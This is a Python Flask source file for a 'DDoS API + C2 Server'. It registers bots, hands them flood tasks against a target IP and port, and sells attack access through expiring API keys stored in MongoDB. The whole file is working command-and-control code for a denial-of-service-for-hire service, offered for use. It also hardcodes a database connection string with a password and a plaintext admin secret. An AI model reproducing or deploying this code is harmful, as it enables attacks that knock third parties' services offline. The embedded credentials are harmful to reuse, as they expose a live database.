# api.py – Complete API server with all admin endpoints, global concurrent limit
from flask import Flask, request, jsonify
from pymongo import MongoClient
from datetime import datetime, timedelta, timezone
import threading
import time
import uuid
import os

app = Flask(__name__)

# ========== CONFIGURATION ==========
MONGO_URI = os.getenv("MONGO_URI", "mongodb+srv://gklvxxdh_db_user:s-uJm2dkF7dfuxD@cluster0.kdwdvs1.mongodb.net/?appName=Cluster0")
GLOBAL_MAX_CONCURRENT = 5
ADMIN_SECRET = "CHUMT_ADMIN_159357"

# ========== MONGODB ==========
client = MongoClient(MONGO_URI)
db = client["ddos_api"]
keys_collection = db["api_keys"]

# ========== BOT & ATTACK TRACKING (in-memory) ==========
bots = {}
active_attacks = {}
active_attacks_lock = threading.Lock()

def get_current_utc():
    return datetime.now(timezone.utc)

# ========== BOT ENDPOINTS ==========
@app.route('/api/bot/register', methods=['POST'])
def register_bot():
    data = request.json
    bot_id = data['bot_id']
    bandwidth = data.get('bandwidth', 1000)
    bots[bot_id] = {
        "ip": data['ip'],
        "status": "online",
        "last_seen": time.time(),
        "bandwidth_mbps": bandwidth
    }
    total_gbps = sum(b['bandwidth_mbps'] for b in bots.values()) / 1000
    print(f"[+] Bot {bot_id} added. Total: {total_gbps:.2f} Gbps")
    return jsonify({"status": "ok"})

@app.route('/api/bot/heartbeat', methods=['POST'])
def heartbeat():
    bot_id = request.json['bot_id']
    if bot_id in bots:
        bots[bot_id]['last_seen'] = time.time()
    return jsonify({"status": "ok"})

@app.route('/api/bot/get_task', methods=['POST'])
def get_task():
    bot_id = request.json['bot_id']
    for attack_id, attack in active_attacks.items():
        if bot_id in attack.get('assigned_bots', []):
            remaining = max(0, int(attack['end_time'] - time.time()))
            if remaining > 0:
                return jsonify({
                    "task": "attack",
                    "attack_id": attack_id,
                    "target": attack['target'],
                    "port": attack['port'],
                    "duration": remaining,
                    "method": attack['method']
                })
            else:
                attack['assigned_bots'].remove(bot_id)
    return jsonify({"task": "idle"})

@app.route('/api/bot/report', methods=['POST'])
def bot_report():
    data = request.json
    attack_id = data.get('attack_id')
    packets = data.get('packets', 0)
    with active_attacks_lock:
        if attack_id in active_attacks:
            active_attacks[attack_id]['total_packets'] += packets
    return jsonify({"status": "ok"})

# ========== ADMIN: KEY MANAGEMENT ==========
@app.route('/api/admin/genkey', methods=['POST'])
def admin_genkey():
    data = request.json
    if data.get('admin_secret') != ADMIN_SECRET:
        return jsonify({"error": "Unauthorized"}), 401
    days = data.get('days', 30)
    max_concurrent = min(data.get('max_concurrent', 1), GLOBAL_MAX_CONCURRENT)
    api_key = str(uuid.uuid4()).replace('-', '')[:24]
    expires_at = get_current_utc() + timedelta(days=days)
    keys_collection.insert_one({
        "api_key": api_key,
        "max_concurrent": max_concurrent,
        "created_at": get_current_utc(),
        "expires_at": expires_at,
        "active": True
    })
    return jsonify({
        "api_key": api_key,
        "api_url": f"{request.host_url}api/v1/attack",
        "expires_days": days,
        "max_concurrent": max_concurrent
    })

@app.route('/api/admin/revoke', methods=['POST'])
def admin_revoke():
    data = request.json
    if data.get('admin_secret') != ADMIN_SECRET:
        return jsonify({"error": "Unauthorized"}), 401
    api_key = data.get('api_key')
    if not api_key:
        return jsonify({"error": "Missing api_key"}), 400
    result = keys_collection.update_one({"api_key": api_key}, {"$set": {"active": False}})
    if result.modified_count:
        return jsonify({"success": True, "message": f"Key {api_key} revoked"})
    return jsonify({"success": False, "error": "Key not found"}), 404

@app.route('/api/admin/delkey', methods=['POST'])
def admin_delkey():
    data = request.json
    if data.get('admin_secret') != ADMIN_SECRET:
        return jsonify({"error": "Unauthorized"}), 401
    api_key = data.get('api_key')
    if not api_key:
        return jsonify({"error": "Missing api_key"}), 400
    result = keys_collection.delete_one({"api_key": api_key})
    if result.deleted_count:
        return jsonify({"success": True, "message": f"Key {api_key} deleted"})
    return jsonify({"success": False, "error": "Key not found"}), 404

@app.route('/api/admin/listkeys', methods=['GET'])
def admin_listkeys():
    secret = request.args.get('admin_secret')
    if secret != ADMIN_SECRET:
        return jsonify({"error": "Unauthorized"}), 401
    keys = list(keys_collection.find({}, {"_id": 0, "api_key": 1, "max_concurrent": 1, "expires_at": 1, "active": 1}))
    for k in keys:
        k['expires_at'] = k['expires_at'].isoformat()
    return jsonify({"keys": keys})

# ========== CUSTOMER ATTACK API ==========
@app.route('/api/v1/attack', methods=['POST'])
def launch_attack():
    data = request.json
    api_key = data.get('api_key')
    target = data.get('ip')
    port = data.get('port')
    duration = min(data.get('duration', 300), 600)
    method = data.get('method', 'udp')

    key_doc = keys_collection.find_one({"api_key": api_key, "active": True})
    if not key_doc or get_current_utc() > key_doc['expires_at']:
        return jsonify({"success": False, "error": "Invalid/expired key"}), 401

    per_user_limit = key_doc.get('max_concurrent', 1)

    with active_attacks_lock:
        if len(active_attacks) >= GLOBAL_MAX_CONCURRENT:
            return jsonify({"success": False, "error": f"Global limit {GLOBAL_MAX_CONCURRENT}"}), 429
        user_attacks = sum(1 for a in active_attacks.values() if a.get('api_key') == api_key)
        if user_attacks >= per_user_limit:
            return jsonify({"success": False, "error": f"Your limit {per_user_limit}"}), 429

    online_bots = [bid for bid, b in bots.items() if b['status'] == 'online' and (time.time() - b['last_seen']) < 60]
    if not online_bots:
        return jsonify({"success": False, "error": "No bots online"}), 503

    with active_attacks_lock:
        # Equal split of bots among all attacks (including new)
        total_attacks = len(active_attacks) + 1
        total_bots = len(online_bots)
        per_attack = total_bots // total_attacks
        if per_attack < 1:
            per_attack = 1
        # Clear existing assignments
        for attack in active_attacks.values():
            attack['assigned_bots'] = []
        # Create new attack
        attack_id = str(uuid.uuid4())[:8]
        end_time = time.time() + duration
        new_attack = {
            "target": target,
            "port": port,
            "duration": duration,
            "method": method,
            "end_time": end_time,
            "assigned_bots": [],
            "api_key": api_key,
            "total_packets": 0
        }
        active_attacks[attack_id] = new_attack
        # Redistribute
        all_attacks = list(active_attacks.values())
        bot_list = online_bots.copy()
        per_attack = len(bot_list) // len(all_attacks)
        for idx, attack in enumerate(all_attacks):
            start = idx * per_attack
            end = start + per_attack
            attack['assigned_bots'] = bot_list[start:end] if start < len(bot_list) else []
        assigned = new_attack['assigned_bots']
        attack_mbps = sum(bots[bid]['bandwidth_mbps'] for bid in assigned)
        attack_gbps = attack_mbps / 1000
        threading.Timer(duration + 5, lambda: cleanup_attack(attack_id)).start()

    return jsonify({
        "success": True,
        "attack_id": attack_id,
        "target": f"{target}:{port}",
        "duration": duration,
        "method": method,
        "bots_assigned": len(assigned),
        "attack_power_gbps": round(attack_gbps, 2),
        "global_concurrent_used": len(active_attacks),
        "global_concurrent_max": GLOBAL_MAX_CONCURRENT,
        "your_concurrent_max": per_user_limit
    })

def cleanup_attack(attack_id):
    with active_attacks_lock:
        if attack_id in active_attacks:
            del active_attacks[attack_id]

@app.route('/api/v1/status/<attack_id>', methods=['GET'])
def attack_status(attack_id):
    with active_attacks_lock:
        if attack_id not in active_attacks:
            return jsonify({"success": False, "error": "Not found"})
        a = active_attacks[attack_id]
        remaining = max(0, int(a['end_time'] - time.time()))
        return jsonify({
            "success": True,
            "status": "running" if remaining > 0 else "finished",
            "remaining_seconds": remaining,
            "target": f"{a['target']}:{a['port']}",
            "bots_active": len(a['assigned_bots'])
        })

@app.route('/api/v1/bots', methods=['GET'])
def bot_list():
    online = sum(1 for b in bots.values() if b['status'] == 'online')
    total_gbps = sum(b['bandwidth_mbps'] for b in bots.values() if b['status'] == 'online') / 1000
    return jsonify({
        "total_bots": len(bots),
        "online_bots": online,
        "total_bandwidth_gbps": round(total_gbps, 2),
        "active_attacks": len(active_attacks)
    })

@app.route('/api/v1/health', methods=['GET'])
def health():
    return jsonify({"status": "ok", "version": "4.0", "max_concurrent_global": GLOBAL_MAX_CONCURRENT})

if __name__ == '__main__':
    print("="*50)
    print("🔥 DDoS API + C2 Server Started")
    print(f"⚡ Global max concurrent: {GLOBAL_MAX_CONCURRENT}")
    print("="*50)
    app.run(host='0.0.0.0', port=5000, threaded=True)